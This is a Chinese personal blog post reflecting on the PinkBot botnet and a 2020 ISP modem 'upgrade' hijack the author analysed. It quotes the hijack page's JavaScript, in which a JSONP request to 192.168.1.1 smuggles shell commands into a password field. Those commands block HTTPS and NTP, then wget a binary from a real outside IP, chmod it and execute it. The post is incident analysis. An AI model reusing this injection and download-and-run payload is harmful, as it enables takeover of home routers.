<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=X-UA-Compatible content="IE=edge, chrome=1"><title>从最近披露的Pink僵尸网络想到的 - zu1k</title><meta name=description content="昨天看到的文章《一个藏在我们身边的巨型僵尸网络 Pink》让我想起了20年初的一起光猫升级事件，以及我对这次事件的一些想法">
<meta name=keywords content="zu1k,zuik,zu1k.com,网络安全,思考,逆向"><meta name=author content="zu1k"><meta property="og:title" content="从最近披露的Pink僵尸网络想到的"><meta property="og:description" content="昨天看到的文章《一个藏在我们身边的巨型僵尸网络 Pink》让我想起了20年初的一起光猫升级事件，以及我对这次事件的一些想法"><meta property="og:type" content="article"><meta property="og:url" content="https://zu1k.com/posts/events/pinkbot/"><meta property="og:image" content="https://zu1k.com/images/logo.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-10-27T13:00:45+08:00"><meta property="article:modified_time" content="2023-03-09T09:04:40+08:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://zu1k.com/images/logo.jpg"><meta name=twitter:title content="从最近披露的Pink僵尸网络想到的"><meta name=twitter:description content="昨天看到的文章《一个藏在我们身边的巨型僵尸网络 Pink》让我想起了20年初的一起光猫升级事件，以及我对这次事件的一些想法"><meta name=twitter:site content="@zu1k_"><meta name=application-name content="zu1k"><meta name=apple-mobile-web-app-title content="zu1k"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><meta itemprop=name content="从最近披露的Pink僵尸网络想到的"><meta itemprop=description content="昨天看到的文章《一个藏在我们身边的巨型僵尸网络 Pink》让我想起了20年初的一起光猫升级事件，以及我对这次事件的一些想法"><meta itemprop=datePublished content="2021-10-27T13:00:45+08:00"><meta itemprop=dateModified content="2023-03-09T09:04:40+08:00"><meta itemprop=wordCount content="2673"><meta itemprop=image content="https://zu1k.com/images/logo.jpg"><meta itemprop=keywords content="event,"><link rel="shortcut icon" type=image/x-icon href=../../../favicon.ico><link rel=icon type=image/png sizes=32x32 href=../../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../../favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=../../../apple-touch-icon.png><link rel=mask-icon href=../../../apple-touch-icon.png color=#5bbad5><link rel=manifest href=../../../site.webmanifest><link rel=canonical href=https://zu1k.com/posts/events/pinkbot/><link rel=prev href=https://zu1k.com/posts/thinking/false-sense-of-security/><link rel=next href=https://zu1k.com/posts/thinking/2021/><link rel=stylesheet href=../../../lib/normalize/normalize.min.css><link rel=stylesheet href=../../../css/style.min.css><link rel=stylesheet href=../../../lib/icon/css/icon-embedded.css><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")})</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-J44P41XVM9"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-J44P41XVM9",{anonymize_ip:!1})}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"从最近披露的Pink僵尸网络想到的","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/zu1k.com\/posts\/events\/pinkbot\/"},"image":[{"@type":"ImageObject","url":"https:\/\/zu1k.com\/images\/logo.jpg","width":256,"height":256}],"genre":"posts","keywords":"event","wordcount":2673,"url":"https:\/\/zu1k.com\/posts\/events\/pinkbot\/","datePublished":"2021-10-27T13:00:45+08:00","dateModified":"2023-03-09T09:04:40+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"zu1k","logo":"https:\/\/zu1k.com\/images\/logo.jpg"},"author":{"@type":"Person","name":"zu1k"},"description":"昨天看到的文章《一个藏在我们身边的巨型僵尸网络 Pink》让我想起了20年初的一起光猫升级事件，以及我对这次事件的一些想法"}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=../../../ title=zu1k>zu1k</a></div><div class=menu><div class=menu-inner><a class=menu-item href=../../../posts/>文章 </a><a class=menu-item href=../../../categories/>分类 </a><a class=menu-item href=../../../tags/>标签 </a><a class=menu-item href=../../../projects/>项目 </a><a class=menu-item href=../../../links/>友链 </a><a class=menu-item href=../../../about/>关于 </a><a class=menu-item href=../../../rss.xml title=RSS><i class=icon-rss></i> </a><a class=menu-item href=https://github.com/zu1k title=GitHub rel="noopener noreffer" target=_blank><i class=icon-github></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class=icon-search></i>
</a><a class="search-button search-clear" id=search-clear-desktop title=清空><i class=icon-cancel-circled></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class=icon-spin2></i>
</span></span><a class="menu-item theme-switch" title=切换主题><i class=icon-adjust></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=../../../ title=zu1k>zu1k</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class=icon-search></i>
</a><a class="search-button search-clear" id=search-clear-mobile title=清空><i class=icon-cancel-circled></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class=icon-spin2></i></span></div><a class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=../../../posts/ title>文章</a><a class=menu-item href=../../../categories/ title>分类</a><a class=menu-item href=../../../tags/ title>标签</a><a class=menu-item href=../../../projects/ title>项目</a><a class=menu-item href=../../../links/ title>友链</a><a class=menu-item href=../../../about/ title>关于</a><a class=menu-item href=../../../rss.xml title=RSS><i class=icon-rss></i></a><a class=menu-item href=https://github.com/zu1k title=GitHub rel="noopener noreffer" target=_blank><i class=icon-github></i></a><a class="menu-item theme-switch" title=切换主题>
<i class=icon-adjust></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class=single-title>从最近披露的Pink僵尸网络想到的</h1><div class=post-meta><div class=post-meta-line>&nbsp;<span class=post-category>收录于 <a href=../../../categories/event/><i class=icon-folder></i>事件</a></span></div><div class=post-meta-line><i class=icon-calendar></i>&nbsp;<time datetime=2021-10-27>2021-10-27</time>&nbsp;<i class=icon-pencil></i>&nbsp;约 2673 字&nbsp;
<i class=icon-clock></i>&nbsp;阅读 6 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon icon-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#光猫升级事件>光猫升级事件</a><ul><li><a href=#官方后门>官方后门</a></li><li><a href=#怀疑被攻击>怀疑被攻击</a></li><li><a href=#联通工作人员上门升级>联通工作人员上门升级</a></li></ul></li><li><a href=#我在第一层人家在第5层>我在第一层，人家在第5层</a><ul><li><a href=#关于看待事情>关于看待事情</a></li><li><a href=#关于现代网络攻击>关于现代网络攻击</a></li><li><a href=#关于个人安全>关于个人安全</a></li></ul></li><li><a href=#参考链接>参考链接</a></li></ul></nav></div></div><div class=content id=content><p>昨天上课的时候无聊刷<a href=https://www.v2ex.com/t/810633 target=_blank rel="noopener noreffer" class=post-link>V2EX</a>，读到 360 Netlab 发布的文章<a href=https://blog.netlab.360.com/pinkbot/ target=_blank rel="noopener noreffer" class=post-link>《一个藏在我们身边的巨型僵尸网络 Pink》</a>，披露了2019年底到2020年春节前后的一个名为"<strong>Pink</strong>&ldquo;的巨型僵尸网络从被发现到攻防博弈过程的一些细节</p><p>文中的攻防过程令我很是激动，因为我想起了在2020年初的一件事</p><h2 id=光猫升级事件><a href=#光猫升级事件 class="header-mark headerLink">光猫升级事件</a></h2><p>2020年1月初，访问某些http协议(80端口)的网站，会被劫持到一个联通光猫升级页面</p><p><figure><a class=lightgallery href=../../../posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp title=百度贴吧被劫持到升级页面 data-thumbnail=/posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp data-sub-html="<h2>百度贴吧被劫持到升级页面</h2><p>百度贴吧被劫持到升级页面</p>"><img src=../../../posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp alt=/posts/events/pinkbot/tieba-web-update_hu9efb79b37fd88cfd06cb61ac5fc742cc_270333_1919x985_resize_q75_h2_box_3.webp height=985 width=1919 loading=lazy></a><figcaption class=image-caption>百度贴吧被劫持到升级页面</figcaption></figure></p><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon icon-info-circled"></i>信息<i class="details-icon icon-angle-circled-right"></i></div><div class=details-content><div class=admonition-content>对这个页面的源码在gist上进行了<a href=https://gist.github.com/zu1k/7120d1f71797153eb8c867bb09323eae target=_blank rel="noopener noreffer" class=post-link>备份</a>，感兴趣的同学可以看一下 <a href=https://gist.github.com/zu1k/7120d1f71797153eb8c867bb09323eae#L9923 target=_blank rel="noopener noreffer" class=post-link>9923</a> 行</div></div></div><h3 id=官方后门><a href=#官方后门 class="header-mark headerLink">官方后门</a></h3><p>通过查看请求和页面源码可以发现这个页面通过向 <code>192.168.1.1</code> 的某个接口进行 <strong>jsonp</strong> 请求来执行命令</p><div class=highlight><div class=chroma><div class=table-wrapper><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>function</span> <span class=nx>ajax</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=c1>//document.getElementById(&#34;tip&#34;).innerHTML=&#34;请重启光猫，并保持页面不关闭，重启后请立即连接光猫WIFI或者网口，等待五分钟后检查网络是否正常&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>dataType</span><span class=o>:</span> <span class=s1>&#39;jsonp&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>data</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>jsonp</span><span class=o>:</span> <span class=s1>&#39;callback&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>url</span><span class=o>:</span> <span class=s1>&#39;http://192.168.1.1/createNewFolder.json?enlpassword=1234567890abcdefx1234567890abcdefxx1234567890abcdefxxx1eee;iptables -I OUTPUT -p tcp --dport 443 -j DROP;iptables -I OUTPUT -p udp --dport 123 -j DROP;if [ ! -f /tmp/sdsjw ] %26%26 wget http://182.43.249.225:19735/sdsjw -P /tmp;then chmod 777 /tmp/sdsjw;/tmp/sdsjw;fi; /jsonp?&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>success</span><span class=o>:</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>data</span><span class=p>));</span>   <span class=c1>// 这里是返回数据
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=c1>//document.getElementById(&#34;tip&#34;).innerHTML=&#34;设备正在升级，请等待五分钟后检查网络是否正常&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=nx>error</span><span class=o>:</span><span class=kd>function</span><span class=p>(</span><span class=nx>XLMHttpResponse</span><span class=p>,</span><span class=nx>textStatus</span><span class=p>,</span><span class=nx>errorThrown</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=nx>XLMHttpResponse</span><span class=p>.</span><span class=nx>status</span> <span class=o>==</span> <span class=mi>200</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                    <span class=c1>//document.getElementById(&#34;tip&#34;).innerHTML=&#34;设备正在升级，请等待五分钟后检查网络是否正常&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span>
</span></span><span class=line><span class=cl>            <span class=nx>complete</span><span class=o>:</span><span class=kd>function</span><span class=p>(</span><span class=nx>XLMHttpResponse</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=nx>XLMHttpResponse</span><span class=p>.</span><span class=nx>status</span> <span class=o>==</span> <span class=mi>200</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                    <span class=c1>//document.getElementById(&#34;tip&#34;).innerHTML=&#34;设备正在升级，请等待五分钟后检查网络是否正常&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div></div><p>很明显，这是一个后门，或者是一个漏洞，我更相信这是一个官方后门</p><p>根据它的写法我稍微测试了一下，通过jsonp跨域，进行CSRF，的确可以执行任意命令</p><p><figure><a class=lightgallery href=../../../posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp title=测试这个后门 data-thumbnail=/posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp data-sub-html="<h2>测试后门</h2><p>测试这个后门</p>"><img src=../../../posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp alt=/posts/events/pinkbot/test-backdoor_hu06ae7568a8eb97acb357abb97fa2cb4f_231622_1919x1079_resize_q75_h2_box_3.webp height=1079 width=1919 loading=lazy></a><figcaption class=image-caption>测试后门</figcaption></figure></p><p>如果被利用了，岂不是？？？又有谁知道到底是不是已经被利用了呢，反正我不知道</p><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon icon-info-circled"></i>信息<i class="details-icon icon-angle-circled-right"></i></div><div class=details-content><div class=admonition-content><p>我很早之前就把光猫设置为桥接模式了，利用自己的路由器拨号，不受该后门影响</p><p>局域网也改为另外一个网段了，“192.168.1.1” 根本没有机器</p></div></div></div><p>再回过头来看升级页面执行的shell命令:</p><div class=highlight><div class=chroma><div class=table-wrapper><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>iptables -I OUTPUT -p tcp --dport <span class=m>443</span> -j DROP<span class=p>;</span>
</span></span><span class=line><span class=cl>iptables -I OUTPUT -p udp --dport <span class=m>123</span> -j DROP<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> ! -f /tmp/sdsjw <span class=o>]</span> <span class=o>&amp;&amp;</span> wget http://182.43.249.225:19735/sdsjw -P /tmp<span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>    chmod <span class=m>777</span> /tmp/sdsjw<span class=p>;</span>
</span></span><span class=line><span class=cl>    /tmp/sdsjw<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>fi</span><span class=p>;</span>
</span></span><span class=line><span class=cl>/jsonp?
</span></span></code></pre></td></tr></table></div></div></div><p>当初看这段命令的时候就觉得非常奇怪</p><p>为什么上来第一句就要阻断到所有目标443端口的tcp连接？当初的一个想法是防止用户用https协议，这样用户只能使用80端口的http明文协议，可以进行监听或者劫持等操作。这样也不合理啊，HSTS也不是吃干饭的，再说联通如果通过更新屏蔽掉到443端口的所有请求，不怕用户集体反馈和投诉吗？反正当初是没想通这个谜之操作</p><p>再看第二句，也莫名其妙，udp 123端口是NTP服务，找你惹你了，犯不着全部屏蔽掉吧。还是想不明白</p><p>往后的命令就比较常规了，下载了一个二进制程序，权限修改为<code>777</code>，然后直接执行</p><h3 id=怀疑被攻击><a href=#怀疑被攻击 class="header-mark headerLink">怀疑被攻击</a></h3><p>通过对上面升级执行的命令进行分析，我觉得这些操作很不符合常理，将这些已知信息在小群里交流之后，怀疑可能是一起攻击事件，通过劫持用户的http访问，利用光猫的后门(可能是漏洞，虽然我不信)植入恶意程序</p><p>遂决定对<code>sdsjw</code>程序进行逆向分析，分析的枯燥过程这里省略了，最后结果就是没有发现什么异常的点，到这里对这个事件的分析便不了了之了（当初的二进制程序我找不到了，现在也下载不到了）</p><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon icon-info-circled"></i>信息<i class="details-icon icon-angle-circled-right"></i></div><div class=details-content><div class=admonition-content><p>通过逆向mips版的升级程序，我得出了两个结论：</p><ul><li>JEB的MIPS逆向体验很不错</li><li>毛子的JEB破解版真好用</li></ul></div></div></div><h3 id=联通工作人员上门升级><a href=#联通工作人员上门升级 class="header-mark headerLink">联通工作人员上门升级</a></h3><p>2020年5月10号下午，联通工作人员上门进行光猫升级。具体升级方法就是把一块板子通过光猫侧面的口插到主板上，然后通过手机上的app进行固件刷写</p><p>在交流的过程中，他透漏光猫大批量被控，有对外攻击流量，接上面要求需要对所有光猫进行升级。我家的光猫在线升级失败，只能到户手动完成。我看了一下他需要上门的名单，看样子我们这个区域关闭了在线管理接口的用户还不少啊哈哈哈</p><p><figure><a class=lightgallery href=../../../posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp title=联通工作人员上门升级 data-thumbnail=/posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp data-sub-html="<h2>联通工作人员上门升级</h2><p>联通工作人员上门升级</p>"><img src=../../../posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp alt=/posts/events/pinkbot/update_hub38e2aa914395ed6062e6a7393690ccd_313646_1080x826_resize_q75_h2_box.webp height=826 width=1080 loading=lazy></a><figcaption class=image-caption>联通工作人员上门升级</figcaption></figure></p><h2 id=我在第一层人家在第5层><a href=#我在第一层人家在第5层 class="header-mark headerLink">我在第一层，人家在第5层</a></h2><p>虽然这个事已经过去一年多了，但现在想起来还是有那么一些感触，在运营商与黑客的一轮又一轮攻防博弈中，我有幸记录下其中某个小小的过程。在信息还未对外揭露之前，我无法理解那些莫名其妙的升级指令，甚至怀疑那是一起攻击事件，利用自己微不足道的知识尝试分析却不得结果。当保密期过去之时，我们得以看到整个事件的原貌，不禁感叹，我还是太年轻了啊（好像听到了“长者”的话）</p><h3 id=关于看待事情><a href=#关于看待事情 class="header-mark headerLink">关于看待事情</a></h3><p>所谓“管中窥豹，略见一斑”，从这件事我学到的第一点便是，要有大局观，要广泛的收集信息，看待某件事时要把时间线放长，这样才能去尽力触及事情的真相</p><h3 id=关于现代网络攻击><a href=#关于现代网络攻击 class="header-mark headerLink">关于现代网络攻击</a></h3><p>我学到的第二点是关于现代网络攻击。我觉得我对网络攻击的印象还停留在早年的那些简单的漏洞利用，虽然近几年通过网络也吃了不少现代网络攻击事件的瓜，但是并未意识到真正的网络攻击就潜伏在你我身边</p><p>通过本次事件我们可以清晰的看出，现代的网络攻击使用的技术更加先进，对隐匿性的要求也更高，如果不是有广泛的监控难以发现。在遇到厂商的狙杀时攻击者能够在第一时间绕过和阻拦，甚至能够在多轮对抗中取得优势将厂商直接阻拦在门外，夺取绝对的控制权，逼迫厂商只能线下进行上门修复</p><p>简单列几句文中的原话：</p><ul><li>“至对光猫固件做了多处改动后，还能确保光猫能够正常使用”</li><li>“在与相关厂商的屡次攻防博弈中，PinkBot 的运营者都占据了明显的对抗优势”</li><li>“PinkBot 在整个过程中表现出了极强的针对性和专业性，各方面能力都很均衡，甚至有些可怕”</li><li>“攻击者还使用了ecdsa对配置信息进行了签名”</li></ul><p>我觉得不可思议的是这一句：</p><ul><li>“我们一直阶段性的对公网上的 Pink 节点进行持续监测，通过对 2021/10/20日的日志分析，我们仍然可以看到 103024 个 IP 处于日活状态。这表明，当前的 pink 的感染规模仍然在 10w 量级左右，涉及多家设备厂商，按照每个IP对应一个三口之家来计算，受影响人群大概 30w 人左右”</li></ul><p>被发现近2年，竟然还没有清除干净，这存活能力得有多强，难以想象</p><p>结论：攻击者能力很强，未来遭遇的攻击会更加专业和可怕</p><h3 id=关于个人安全><a href=#关于个人安全 class="header-mark headerLink">关于个人安全</a></h3><p>关于个人安全，其实我没有发言权，毕竟我也曾踩过别人的水坑</p><p>但是我还是要说一句，就是保持差异化，默认的配置只会给攻击者创造便利</p><p>再加一句，不要把自己的安全完全托付在别人手中</p><h2 id=参考链接><a href=#参考链接 class="header-mark headerLink">参考链接</a></h2><ul><li><a href=https://www.v2ex.com/t/810633 target=_blank rel="noopener noreffer" class=post-link>运营商收回公网 IP 的原因之一</a></li><li><a href=https://blog.netlab.360.com/pinkbot/ target=_blank rel="noopener noreffer" class=post-link>一个藏在我们身边的巨型僵尸网络 Pink</a></li><li><a href=https://www.freebuf.com/articles/endpoint/243189.html target=_blank rel="noopener noreffer" class=post-link>用户端设备ONU被肉鸡攻击实例浅析</a></li></ul></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2023-03-09&nbsp;<a class=git-hash href=https://github.com/zu1k/blog/commit/02213a06c2b9d3e37b921114d9fc477b0d270e76 target=_blank title="commit by zu1k(i@zu1k.com) 02213a06c2b9d3e37b921114d9fc477b0d270e76: fix typo">
<i class=icon-hashtag></i>02213a0</a></span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=../../../posts/events/pinkbot/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a title="分享到 Twitter" data-sharer=twitter data-url=https://zu1k.com/posts/events/pinkbot/ data-title=从最近披露的Pink僵尸网络想到的 data-via=zu1k_ data-hashtags=event><i class=icon-twitter></i>
</a><a title="分享到 Tumblr" data-sharer=tumblr data-url=https://zu1k.com/posts/events/pinkbot/ data-title=从最近披露的Pink僵尸网络想到的 data-caption="昨天看到的文章《一个藏在我们身边的巨型僵尸网络 Pink》让我想起了20年初的一起光猫升级事件，以及我对这次事件的一些想法" data-tags=event><i class=icon-tumblr></i>
</a><a title="分享到 Evernote" data-sharer=evernote data-url=https://zu1k.com/posts/events/pinkbot/ data-title=从最近披露的Pink僵尸网络想到的><i class=icon-evernote></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class=icon-tags></i>&nbsp;<a href=../../../tags/event/>事件</a></section><section><span><a onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=../../../>主页</a></span></section></div><div class=post-nav><a href=../../../posts/thinking/false-sense-of-security/ class=prev rel=prev title=虚假的安全感><i class=icon-angle-left></i>虚假的安全感</a>
<a href=../../../posts/thinking/2021/ class=next rel=next title=2021年终总结>2021年终总结<i class=icon-angle-right></i></a></div></div><div id=comments><div class=giscus id=giscus></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app/zh-CN>Giscus</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class=icon-copyright></i><span itemprop=copyrightYear>2017 - 2025</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://zu1k.com target=_blank>zu1k</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class=icon-up></i>
</a><a id=view-comments class=fixed-button title=查看评论><i class=icon-comment></i></a></div><link rel=stylesheet href=../../../lib/lightgallery/lightgallery.min.css><script type=text/javascript src=../../../lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=../../../lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=../../../lib/fuse/fuse.min.js></script><script type=text/javascript src=../../../lib/instant-page/5.1.0.min.js></script><script type=text/javascript src=../../../lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=../../../lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=../../../lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=../../../lib/clipboard/clipboard.min.js></script><script type=text/javascript src=../../../lib/sharer/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:100},comment:{giscus:{category:"Comments",categoryid:"DIC_kwDOEfJ9084CA02V",enable:!0,mapping:"og:title",repo:"zu1k/blog",repoid:"MDEwOlJlcG9zaXRvcnkzMDExMDQ1OTU="}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},search:{distance:100,findAllMatches:!1,fuseIndexURL:"/index.json",highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!0,isCaseSensitive:!1,location:null,maxResultLength:10,minMatchCharLength:1,noResultsFound:"没有找到结果",snippetLength:50,threshold:.6,type:"fuse",useExtendedSearch:!0}}</script><script type=text/javascript src=../../../js/theme.min.js></script></body></html>